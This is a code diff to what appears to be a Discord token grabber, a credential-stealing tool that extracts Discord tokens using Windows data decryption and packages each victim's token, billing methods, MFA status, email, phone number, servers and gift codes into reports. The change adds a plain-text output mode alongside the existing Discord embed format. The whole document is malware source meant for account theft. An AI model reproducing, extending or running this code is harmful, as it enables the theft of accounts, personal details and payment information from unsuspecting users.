@@ -8,8 +8,8 @@ from discord import Embed
 from win32crypt import CryptUnprotectData
 
 class grab_discord():
-    def initialize():
-        return fetch_tokens().upload()
+    def initialize(raw_data):
+        return fetch_tokens().upload(raw_data)
         
 class extract_tokens:
     def __init__(self) -> None:
@@ -121,7 +121,7 @@ class fetch_tokens:
     def __init__(self):
         self.tokens = extract_tokens().tokens
     
-    def upload(self):
+    def upload(self, raw_data):
         if not self.tokens:
             return
         final_to_return = []
@@ -190,23 +190,26 @@ class fetch_tokens:
                 else: codes = None
             else: codes = None
 
-            embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
-            embed.set_thumbnail(url=avatar)
+            if not raw_data:
+                embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
+                embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
-            embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
-            embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
-            embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
-            
-            embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
-            embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    
+                embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
+                embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
+                embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
+                embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
+                
+                embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
+                embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    
 
 
-            if hq_guilds != None:
-                embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)
+                if hq_guilds != None:
+                    embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)
 
-            if codes != None:
-                embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)
+                if codes != None:
+                    embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)
 
-            final_to_return.append(embed)
+                final_to_return.append(embed)
+            else:
+                final_to_return.append(f'Username: {username} ({user_id})\nToken: {token}\nNitro: {nitro}\nBilling: {payment_methods if payment_methods != "" else "None"}\nMFA: {mfa}\nEmail: {email if email != None else "None"}\nPhone: {phone if phone != None else "None"}\nHQ Guilds: {hq_guilds}\nGift codes: {codes}')
         return final_to_return
